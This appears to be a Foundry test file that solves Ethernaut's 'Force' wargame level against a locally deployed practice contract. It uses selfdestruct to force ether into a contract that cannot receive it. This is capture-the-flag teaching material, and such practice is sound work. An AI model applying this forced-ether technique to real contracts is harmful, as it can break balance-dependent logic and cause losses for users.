// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/Test.sol";
import "../src/07_Force.sol";

/*
Author: @BoscoHuang


Command:
- forge test --match-contract ForceTest --fork-url http://127.0.0.1:8545 -vvv
*/

contract ForceTest is Test {
    Force Ethernaut07;

    function setUp() public {
        Ethernaut07 = Force(payable(0x5FbDB2315678afecb367f032d93F642f64180aa3)); // Force contract address in anvil
    }

    function testEthernaut07() public {
        console.log("Balance Before:", address(Ethernaut07).balance);

        selfdestruct(
            payable(address(Ethernaut07))
        );

        console.log("Balance After:", address(Ethernaut07).balance);
    }

    receive() external payable {}
}

